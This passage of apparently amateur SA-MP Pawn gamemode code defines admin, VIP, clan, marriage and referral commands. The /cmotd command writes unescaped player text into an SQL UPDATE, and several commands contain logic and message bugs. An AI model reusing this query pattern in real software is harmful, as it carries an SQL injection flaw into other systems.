			format(string, sizeof(string),"{ba9789}Admin %s a oferit %s Premium Points tuturor jucatorilor online.[/shop]",sendername,FormatNumber(moneyall));
			SendClientMessageToAll(0xFFE4B5FF,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pPremiumPoints] += moneyall;
			}
		}
	}
	else
	{
	     SCM(playerid, COLOR_SERVER, AdminOnly);
	 	 return 1;
	}
	return 1;
}
CMD:giveallgift(playerid, params[])
{
	new string[1000];
	if(PlayerInfo[playerid][pAdmin] > 5)
	{
	    format(string, sizeof(string),"{ba9789}Admin %s gave access to all players to use GiftBox. [/getgift]",GetName(playerid));
		SendClientMessageToAll(COLOR_SERVER,string);
		foreach(Player, i)
		{
			PlayerInfo[i][pGiftTime] = 0;
		}
	}
	return 1;
}
CMD:giveallhidden(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new moneyall,sendername[MAX_PLAYER_NAME],string[150];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",moneyall)) return SCM(playerid, 0xFFFFFFFF, "Tasteaza: /giveallhidden <hidden-uri>");
		if(moneyall >= 99) return SCM(playerid, 0xF0F8FFFF, "Error: Too much hiddens.");
		else if(moneyall < 99)
		{
			format(string, sizeof(string),"{ba9789}Admin %s offered %s hidden color all players online.[/carcolor]",sendername,FormatNumber(moneyall));
			SendClientMessageToAll(0xFFE4B5FF,string);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				PlayerInfo[i][pHiddenColor] += moneyall;
				Update(i, pHiddenColorx);
			}
		}
	}
	else
	{
	     SCM(playerid, COLOR_SERVER, AdminOnly);
	 	 return 1;
	}
	return 1;
}
CMD:givepp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,premiump,admname[25],giveplayer[25];
	if(sscanf(params, "ud",id,premiump)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setpp <Name/Playerid> <Premium Points>");
	PlayerInfo[id][pPremiumPoints] += premiump;
	Update(id,pPremiumPointsx);
	GetPlayerName(playerid,admname,sizeof(admname));
	GetPlayerName(id,giveplayer,sizeof(giveplayer));
	new string[128],string2[128];
	format(string, sizeof(string), "Admin %s has set your Premium Points to %d.", admname, PlayerInfo[id][pPremiumPoints]);
	SendClientMessage(id, COLOR_LIGHTBLUE, string);
	format(string2, sizeof(string2), "You set %s Premium Points to %d.", giveplayer, PlayerInfo[id][pPremiumPoints]);
	SendClientMessage(playerid, COLOR_ERROR, string2);
	new sqlupdate[1000];
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET PPReff=PPReff+%d WHERE `id`='%d'",premiump/10,PlayerInfo[id][pReferral]);
	mysql_tquery(SQL, sqlupdate, "", "");
    return 1;
}
CMD:setpp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 7) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,premiump,admname[25],giveplayer[25];
	if(sscanf(params, "ud",id,premiump)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setpp <Name/Playerid> <Premium Points>");
	PlayerInfo[id][pPremiumPoints] = premiump;
	Update(id,pPremiumPointsx);
	GetPlayerName(playerid,admname,sizeof(admname));
	GetPlayerName(id,giveplayer,sizeof(giveplayer));
	new string[128],string2[128];
	format(string, sizeof(string), "Admin %s has set your Premium Points to %d.", admname, PlayerInfo[id][pPremiumPoints]);
	SendClientMessage(id, COLOR_LIGHTBLUE, string);
	format(string2, sizeof(string2), "You set %s Premium Points to %d.", giveplayer, PlayerInfo[id][pPremiumPoints]);
	SendClientMessage(playerid, COLOR_ERROR, string2);
	new sqlupdate[1000];
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET PPReff=PPReff+%d WHERE `id`='%d'",premiump/10,PlayerInfo[id][pReferral]);
	mysql_tquery(SQL, sqlupdate, "", "");
    return 1;
}
// SISTEM DAILY BONUS
/*CMD:spin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pDailyBonus] == 1)
	{
		PlayerTextDrawSetPreviewModel(playerid, DailyTD[27], 18631);
		PlayerTextDrawSetPreviewModel(playerid, DailyTD[30], 18631);
		PlayerTextDrawSetPreviewModel(playerid, DailyTD[31], 18631);
		PlayerTextDrawSetPreviewRot(playerid, DailyTD[27], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetPreviewRot(playerid, DailyTD[30], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetPreviewRot(playerid, DailyTD[31], 0.000000, 0.000000, 0.000000, 1.000000);
		PlayerTextDrawSetString(playerid, DailyTD[28], "");
		PlayerTextDrawSetString(playerid, DailyTD[29], "");
		PlayerTextDrawSetString(playerid, DailyTD[32], "");
		for(new i = 0; i < sizeof(DailyTD); i++) PlayerTextDrawShow(playerid, DailyTD[i]);
		rotiredailybonus[playerid] = 3;
		PlayerInfo[playerid][pDailyBonus] = 0;
		new sqlupdate[1000];
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id`='%d'",PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, sqlupdate, "","");
	}
	else return SCM(playerid, COLOR_ERROR, "Ai folosit deja aceasta comanda, asteapta ziua urmatoare!");
	return 1;
}*/
// SISTEM CASATORIE
CMD:marriage(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id;
	if(sscanf(params, "d", id)) return SCM(playerid, -1, "/marriage [id jucator]");
	if(timercasatorie[playerid] > 0) return SCM(playerid, COLOR_ERROR, "Wait a minute to be able to use this command.");
	if(PlayerInfo[playerid][pCasatorit] > 0) return SCM(playerid, COLOR_ERROR, "Already married(a).");
	if(PlayerInfo[id][pCasatorit] > 0) return SCM(playerid, COLOR_ERROR, "That player is already married (a).");
	if(playerid == id) return SCM(playerid, COLOR_ERROR, "Nu poti face asta.");
	if(!IsPlayerInRangeOfPlayer(playerid, id, 3.0)) return SCM(playerid, COLOR_ERROR, "That player is not near you.");
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1765.1915,-1767.0513,13.7606)) return SCM(playerid, COLOR_ERROR, "There are church!");
	if(IsPlayerConnected(id))
	{
		invitatiecasatorie[id] = playerid;
		format(MGLOBAL, sizeof(MGLOBAL), "%s you proposed marriage\nWant to accept?",PlayerInfo[playerid][pNormalName]);
		ShowPlayerDialog(id, DIALOG_CASATORIE, DIALOG_STYLE_MSGBOX, "Marriage", MGLOBAL, "Yes!", "No!");
		SCM(playerid, COLOR_SERVER, "The application was sent!");
		timercasatorie[playerid] = 60;
	}
	return 1;
}
CMD:divort(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pCasatorit]  < 1) return SCM(playerid, COLOR_ERROR, "Nu esti casatorit(a).");
	new sqlupdate[1000];
	new numedivort[64];
	new rezultat[1000];
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `users` WHERE `id`='%d'",PlayerInfo[playerid][pCasatorit]);
	new Cache: divortsql = mysql_query(SQL, sqlupdate);
	for(new i, c = cache_get_row_count(); i != c; i++)
	{
		cache_get_field_content(i, "name", rezultat), format(numedivort, sizeof(numedivort), rezultat);
	}
	cache_delete(divortsql);
	PlayerInfo[playerid][pCasatorit] = 0;
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Judecator:  {FFFFFF}Ai divortat de %s.",numedivort);
	SCM(playerid, -1, MGLOBAL);
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','%s a divortat de tine!')",PlayerInfo[playerid][pCasatorit],PlayerInfo[playerid][pNormalName]);
	mysql_tquery(SQL,sqlupdate,"","");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pSQLID] == PlayerInfo[playerid][pCasatorit])
			{
				PlayerInfo[i][pCasatorit] = 0;
			}
		}
	}
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `Casatorit`='0' WHERE `id`='%d'", PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, sqlupdate, "", "");
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `Casatorit`='0' WHERE `id`='%d'", PlayerInfo[playerid][pCasatorit]);
	mysql_tquery(SQL, sqlupdate, "", "");
	return 1;
}
// COMENZII CLAN
CMD:cattack(playerid, params[])
{	
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pClan] > 0 && PlayerInfo[playerid][pCRank] >= 6)
	{
		new hour,minn,sec;
		gettime(hour,minn,sec);
		if(hour == 19)
		{
			new id;
			if(sscanf(params, "d", id)) return SCM(playerid, -1, "/cattack [id player (co-leader / clan leader)]");
			if(IsPlayerConnected(id))
			{
				if(PlayerInfo[id][pClan] > 0 && PlayerInfo[id][pCRank] >= 6)
				{
					new idc = PlayerInfo[id][pClan];
					new cid = PlayerInfo[playerid][pClan];
					if(idc == cid) return SCM(playerid, COLOR_ERROR, "You can invite your own clan war.");
					if(ClanInfo[idc][cClanVerificat] != 1) return SCM(playerid, COLOR_ERROR, "Clan that is not checked.");
					if(ClanInfo[cid][cClanVerificat] != 1) return SCM(playerid, COLOR_ERROR, "Your clan is not checked.");
					if(ClanWar[cid][cClanTime] > 0) return SCM(playerid, COLOR_ERROR, "Your clan is already in a war.");
					if(ClanWar[idc][cClanTime] == 0)	
					{
						new nri = 0;
						new nrx = 0;
						new diferenta;
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
							if(PlayerInfo[i][pClan] == PlayerInfo[playerid][pClan])
							{
								nri++;
							}
						}
						for(new x = 0; x < MAX_PLAYERS; x++)
						{
							if(PlayerInfo[x][pClan] == PlayerInfo[playerid][pClan])
							{
								nrx++;
							}
						}
						if(nri < 4 || nrx < 4) return SCM(playerid, COLOR_ERROR, "Both teams must have a minimum 4 members online.");
						invitatiecattack[playerid] = id;
						invitatiecattack[id] = playerid;
						if(nri > nrx) diferenta = nri-nrx;
						if(nri < nrx) diferenta = nrx-nri;
						if(diferenta > 4) return SCM(playerid, COLOR_ERROR, "One of the Clans have more active members than the other, you can not start a war.");
						format(MGLOBAL, sizeof(MGLOBAL), "(Co-)Leader %s - %s He invited you to war.\nDo you want to take or reject?",ClanInfo[cid][cClanName], PlayerInfo[playerid][pNormalName]);
						ShowPlayerDialog(id, DIALOG_CLANWAR, DIALOG_STYLE_MSGBOX, "Clan War", MGLOBAL, "Accept", "Refuse");
						format(MGLOBAL, sizeof(MGLOBAL), "You invited (Co-)leader Clan %s - %s to war.",ClanInfo[idc][cClanName], PlayerInfo[id][pNormalName]);
						SCM(playerid, COLOR_SERVER, MGLOBAL);
					}
					else return SCM(playerid, COLOR_ERROR, "That clan is already in a war.");
				}
				else return SCM(playerid, COLOR_ERROR, "That player is leader or co-leader in a Clan.");
			}
			else return SCM(playerid, COLOR_ERROR, "That player is offline.");
		}
		else return SCM(playerid, COLOR_ERROR, "Attacks clan takes place only between the hours 19:00-20:00");
	}
	else return SCM(playerid, COLOR_ERROR, "You're not in a clan or not you own rank 6+.");
	return 1;
}
// COMENZII VIP
CMD:setvip(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pAdmin] < 7) return SCM(playerid,COLOR_ERROR, AdminOnly);
	new id,premiump,admname[25],giveplayer[25];
	if(sscanf(params, "ud",id,premiump)) return SCM(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/setvip <Name/Playerid> <0 = Standard, 1 = VIP>");
	PlayerInfo[id][pVip] = premiump;
	Update(id,pVipx);
	new viptext[256];
	if(PlayerInfo[id][pVip] == 0) viptext = "Standard";
	else if(PlayerInfo[id][pVip] == 1) viptext = "VIP";
	GetPlayerName(playerid,admname,sizeof(admname));
	GetPlayerName(id,giveplayer,sizeof(giveplayer));
	new string[128],string2[128];
	format(string, sizeof(string), "Admin %s It sets the account status to %s.", admname, viptext);
	SendClientMessage(id, COLOR_LIGHTBLUE, string);
	format(string2, sizeof(string2), "You set by %s the account status %s.", giveplayer, viptext);
	SendClientMessage(playerid, COLOR_ERROR, string2);
	format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}Admin %s set the account status of %s The %s.",admname, giveplayer, viptext);
	ABroadCast(COLOR_AdminWarn, string, 6);
	if(PlayerInfo[id][pVip] == 1)
	{
		new contvip;
		new sqlupdate[1000];
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `users` WHERE `ID`='%d' AND `ContVip`='0'",PlayerInfo[id][pReferral]);
		new Cache: verificarevip = mysql_query(SQL, sqlupdate);
		contvip = cache_get_row_count();
		cache_delete(verificarevip);
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `users` WHERE `Referral`='%d' AND `ContVip`='1'",PlayerInfo[id][pReferral]);
		new Cache: verificare = mysql_query(SQL, sqlupdate);
		if(cache_get_row_count() == 3 && contvip == 1)
		{
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `ContVip`='1' WHERE `id`='%d' AND `ContVip`='0'",PlayerInfo[id][pReferral]);
			mysql_tquery(SQL, sqlupdate, "", "");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(PlayerInfo[i][pSQLID] == PlayerInfo[id][pReferral])
				{
					PlayerInfo[i][pVip] = 1;
					Update(playerid, pVipx);
				}
			}
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "INSERT INTO emails (`playerid`,`Message`) VALUES ('%d', 'Contul tau s-a extins intr-unul VIP, deoarece 3 referrali si-au extins Contul intr-unul VIP.')",PlayerInfo[id][pReferral]);
		    mysql_tquery(SQL, sqlupdate, "","");
		}
		cache_delete(verificare);
		if(contvip == 0)
		{
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET PPReff=PPReff+50 WHERE `id`='%d'",PlayerInfo[id][pReferral]);
			mysql_tquery(SQL, sqlupdate, "", "");
		}
	}	
    return 1;
}
CMD:portbagaj(playerid, params[])
{	
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
 	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
	&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0)
 	    return SendClientMessage(playerid, COLOR_SERVER, "Not own any car.");
	new executat = 0;
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_ERROR, "This command is not accessible in a vehicle.");
	for(new v=0; v<=MAX_PVEHS; v++)
	{
		if(v == 15) { break; }
		if(personalcar[v][playerid] != 0)
		{
		    if(CheckPlayerDistanceToVehicle(4.0, playerid, personalcar[v][playerid]))
			{
				new vid = personalcar[v][playerid];
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 1, objective);
				new idv = OwnedVeh(vid);
				if(CarInfo[idv][cModel] == 522 || CarInfo[idv][cModel] == 521 || CarInfo[idv][cModel] == 461 || CarInfo[idv][cModel] == 462
				|| CarInfo[idv][cModel] == 463 || CarInfo[idv][cModel] == 468 || CarInfo[idv][cModel] == 471 || CarInfo[idv][cModel] == 509 ||
				CarInfo[idv][cModel] == 581 || CarInfo[idv][cModel] == 586) return SCM(playerid, COLOR_ERROR, "Acel vehicul nu are portbagaj.");
				new arme = 0;
				if(CarInfo[idv][vArma1] > 0) arme++;
				if(CarInfo[idv][vArma2] > 0) arme++;
				if(CarInfo[idv][vArma3] > 0) arme++;
				PortbagajVID[playerid] = vid;
				executat = 1;
				format(MGLOBAL, sizeof(MGLOBAL), "Item\tAmount\nArms\t%d\nDrugs\t%dg\nMoney\t$%s",arme,CarInfo[idv][vDroguri],FormatNumber(CarInfo[idv][vBani]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ, DIALOG_STYLE_TABLIST_HEADERS, "vehicle trunk.", MGLOBAL, "Select", "CANCEL");
			}
		}	
	}
	if(executat == 0) SCM(playerid, COLOR_ERROR, "You're not your personal vehicle trunk.");
	return 1;
}
CMD:viplogin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "To use this command, your account status must be VIP.");
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Auto Login\n\n\
	{FFFFFF}Auto Login allows you Remember (without entering the password and security word).\n\
	Click Activate to enable this option.\n\n{FF0000}Careful{FFFFFF}\n\n\
	If your router sends Internet and to other users, they warn you that you can enter your account because they have your class IP.\n\
	Therefore, this option SELF.");
	ShowPlayerDialog(playerid, DIALOG_VIPLOGIN, DIALOG_STYLE_MSGBOX, "Option - Auto Login", MGLOBAL , "Activate", "Disable");
	return 1;
}	
CMD:vc(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "To use this command, your account status must be VIP.");
	new string[1000],mesaj[512];
	if(sscanf(params, "s[512]", mesaj)) return SCM(playerid, COLOR_ORANGE, "/vc {FFFFFF}<Message>");
	format(string, sizeof(string), "* (V.I.P) %s: {FFFFFF}%s",PlayerInfo[playerid][pNormalName],mesaj);
	MVIP(COLOR_ORANGE, string);
	return 1;
}
CMD:togvc(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "To use this command, your account status must be VIP.");
	if(vipchat[playerid] == 1) vipchat[playerid] = 0, SCM(playerid, COLOR_SERVER, "VIP chat was offt.");
	else if(vipchat[playerid] == 0) vipchat[playerid] = 1, SCM(playerid, COLOR_SERVER, "VIP chat has been enabled.");
	return 1;
}
CMD:vr(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "To use this command, your account status must be VIP.");
	if(PlayerInfo[playerid][pWantedLevel] != 0) return SCM(playerid,COLOR_SERVER,"You can not use this command because you wanted.");
	if(IsPlayerInRangeOfPoint(playerid, BLRaza, BLXYZ[0], BLXYZ[1], BLXYZ[2])) return SCM(playerid, COLOR_ERROR, "You can not use this command because you are in a restricted area of an admin.");
	if(IsPlayerInAnyVehicle(playerid))
	{
		RepairVehicle(GetPlayerVehicleID(playerid));
		SendClientMessage(playerid, COLOR_ORANGE, "VIP: {FFFFFF}The vehicle was repaired.");
	}
	else return SCM(playerid, COLOR_ERROR, "You're in a vehicle.");
	return 1;
}
CMD:vf(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if (PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "To use this command, your account status must be VIP.");
	if(PlayerInfo[playerid][pWantedLevel] != 0) return SCM(playerid,COLOR_SERVER,"You can not use this command because you wanted.");
	if(IsPlayerInRangeOfPoint(playerid, BLRaza, BLXYZ[0], BLXYZ[1], BLXYZ[2])) return SCM(playerid, COLOR_ERROR, "You can not use this command because you are in a restricted area of an admin.");
	if(IsPlayerInAnyVehicle(playerid))
	{
		new Float:angle,
    		currentveh = GetPlayerVehicleID(playerid);
    	GetVehicleZAngle(currentveh, angle);
    	SetVehicleZAngle(currentveh, angle);
		SendClientMessage(playerid, COLOR_ORANGE, "VIP: {FFFFFF}The vehicle was recovered.");
	}
	else return SCM(playerid, COLOR_ERROR, "You're in a vehicle.");
	return 1;
}
CMD:cmotd(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pCRank] < 7) return SCM(playerid, COLOR_ERROR, "Do not own a clan.");
	new motd[128];
	if(sscanf(params, "s[128]", motd)) return SCM(playerid, COLOR_SERVER, "/cmotd [text (120 CHARACTERS).");
	if(strlen(motd) > 120) return SCM(playerid, COLOR_ERROR, "Up to 120 characters.");
	new id = PlayerInfo[playerid][pClan];
	format(ClanInfo[id][cClanMOTD], 256, "%s",motd);
	SCM(playerid, COLOR_SERVER, "Clan MOTD este acum:");
	format(MGLOBAL, sizeof(MGLOBAL), "%s",motd);
	SCM(playerid, COLOR_SERVER, MGLOBAL);
	new sqlupdate[1000];
	mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `clans` SET `clanMOTD`='%s' WHERE `clanID`='%d'",motd, PlayerInfo[playerid][pClan]);
	mysql_tquery(SQL, sqlupdate, "", "");
	return 1;
}
CMD:cupgrade(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pCRank] < 7) return SCM(playerid, COLOR_ERROR, "Do not own a clan.");
	new sqlselect[1000];
	new verificat;
	mysql_format(SQL, sqlselect, sizeof(sqlselect), "SELECT * FROM `clans` WHERE `clanID`='%d'",PlayerInfo[playerid][pClan]);
	new Cache: verificare = mysql_query(SQL, sqlselect);
	for(new i, j = cache_get_row_count(); i != j ; i++)
	{
		verificat = cache_get_field_content_int(i, "ClanVerificat");
	}
	cache_delete(verificare);
	if(verificat == 0)
	{
		format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Status Clan: uncontrollable");
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}A) {FFFFFF}Clan Upgrade\n\n\
		{C6C96D}1.{FFFFFF}Clan Upgrade is a way of verifying the clan to hold more functions to it.\n\
		{C6C96D}2.{FFFFFF}More details about checking your clan can be found in section B.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}B) {FFFFFF}checking clan\n\n\
		{C6C96D}1.{FFFFFF}Checking a clan is done automatically by the server.\n\
		{C6C96D}2.{FFFFFF}When your clan is under verification server examines its activity.\n\
		\tCheck the clan can be activated only between the hours of 10:00 to 4:00 p.m., checking clan runs from 8 to 10:00.\n\
		{C6C96D}3.{FFFFFF}When checking clan are correct it will be automatically extended.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}C) {FFFFFF}Enlargement Clan\n\n\
		{C6C96D}1.{FFFFFF}Clan will be able to accommodate 30 members.\n\
		{C6C96D}2.{FFFFFF}Clan will be able to attack another clan and win prizes.\n\
		{C6C96D}3.{FFFFFF}Clan will be able to appear in the top 5 clans (/topclans).",MGLOBAL);
		ShowPlayerDialog(playerid, DIALOG_CLANUPGRADE+1, DIALOG_STYLE_MSGBOX, "Clan Upgrade", MGLOBAL, "Verification", "CANCEL");
	}
	if(verificat > 1)
	{
		format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Status Clan: Reviewing");
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}A) {FFFFFF}Clan Upgrade\n\n\
		{C6C96D}1.{FFFFFF}Clan Upgrade is a way of verifying the clan to hold more functions to it.\n\
		{C6C96D}2.{FFFFFF}More details about checking your clan can be found in section B.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}B) {FFFFFF}checking clan\n\n\
		{C6C96D}1.{FFFFFF}Checking a clan is done automatically by the server.\n\
		{C6C96D}2.{FFFFFF}When your clan is under verification server examines its activity.\n\
		\tCheck the clan can be activated only between the hours of 10:00 to 4:00 p.m., checking clan runs from 8 to 10:00.\n\
		{C6C96D}3.{FFFFFF}When checking clan are correct it will be automatically extended.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}C) {FFFFFF}Enlargement Clan\n\n\
		{C6C96D}1.{FFFFFF}Clan will be able to accommodate 30 members.\n\
		{C6C96D}2.{FFFFFF}Clan will be able to attack another clan and win prizes.\n\
		{C6C96D}3.{FFFFFF}Clan will be able to appear in the top 5 clans (/topclans).",MGLOBAL);
		ShowPlayerDialog(playerid, DIALOG_CLANUPGRADE, DIALOG_STYLE_MSGBOX, "Clan Upgrade", MGLOBAL, "OK", "");
	}
	if(verificat == 1)
	{
		format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Status Clan: verified");
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}A) {FFFFFF}Clan Upgrade\n\n\
		{C6C96D}1.{FFFFFF}Clan Upgrade is a way of verifying the clan to hold more functions to it.\n\
		{C6C96D}2.{FFFFFF}More details about checking your clan can be found in section B.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}B) {FFFFFF}checking clan\n\n\
		{C6C96D}1.{FFFFFF}Checking a clan is done automatically by the server.\n\
		{C6C96D}2.{FFFFFF}When your clan is under verification server examines its activity.\n\
		\tCheck the clan can be activated only between the hours of 10:00 to 4:00 p.m., checking clan runs from 8 to 10:00.\n\
		{C6C96D}3.{FFFFFF}When checking clan are correct it will be automatically extended.",MGLOBAL);
		format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{C6C96D}C) {FFFFFF}Enlargement Clan\n\n\
		{C6C96D}1.{FFFFFF}Clan will be able to accommodate 30 members.\n\
		{C6C96D}2.{FFFFFF}Clan will be able to attack another clan and win prizes.\n\
		{C6C96D}3.{FFFFFF}Clan will be able to appear in the top 5 clans (/topclans).",MGLOBAL);
		ShowPlayerDialog(playerid, DIALOG_CLANUPGRADE, DIALOG_STYLE_MSGBOX, "Clan Upgrade", MGLOBAL, "OK", "");
	}
	return 1;
}
CMD:referral(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(timereferral[playerid] > 0) return SCM(playerid, COLOR_ERROR, "This command can be used once every two minutes!");
	new referali;
	new sqlselect[1000];
	mysql_format(SQL, sqlselect, sizeof(sqlselect), "SELECT * FROM `users` WHERE `Referral`='%d'",PlayerInfo[playerid][pSQLID]);
	new Cache: verificare = mysql_query(SQL, sqlselect);
	referali = cache_get_row_count();
	cache_delete(verificare);
	format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}%d {FFFFFF}players claim to have been brought by you.\n\n\
	\t{0066FF}A) {FFFFFF}System Referral\n\n{0066FF}1.{FFFFFF}Referral system keeps track of new players brought into the server by another player.\n\
	{0066FF}2.{FFFFFF}The player who brought the other players on the server will be rewarded automatically in certain conditions met by referrali.",referali);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{0066FF}B) {FFFFFF}Referral actuator\n\n\
	{0066FF}1.{FFFFFF}If you friends, knowledge which looking for a server to-MP, tell them to come on our server and enter your name at the end of the record when it is asked who was brought on the server.\n\
	{0066FF}2.{FFFFFF}If anumitul invited referral) has introduced your name at the choice of the player who brought on the server you will benefit from certain rewards.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{0066FF}3.{FFFFFF}More details about the rewards are disclosed to the point C.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n\n\t{0066FF}C) {FFFFFF}Reward\n\n\
	{0066FF}1.{FFFFFF}If referralul acquires a new level you first 2 RP + half of the amount which he has spent for the purchase of the level of the.\n\
	{0066FF}2.{FFFFFF}If referralul acquire Premium Points you will get 10 percent of the amount of the premium points acquired.\n\
	{0066FF}3.{FFFFFF}If referralul acquire Premium Points you will get 10 percent of the amount of the premium points acquired.",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s\n{0066FF}4.{FFFFFF}If 3 referrali shall extend my account in one VIP, and yours is one standard, you first VIP account for free.\n\tIf 3 referrali shall extend my account in one VIP, and yours is one standard, you first VIP account for free..\n\
	{0066FF}5.{FFFFFF}To collect the rewards from Referrali press the button `{0066FF}Menu{FFFFFF}`.",MGLOBAL);
	ShowPlayerDialog(playerid, DIALOG_REFERRAL+1, DIALOG_STYLE_MSGBOX, "System Referral", MGLOBAL, "Menu", "Back");
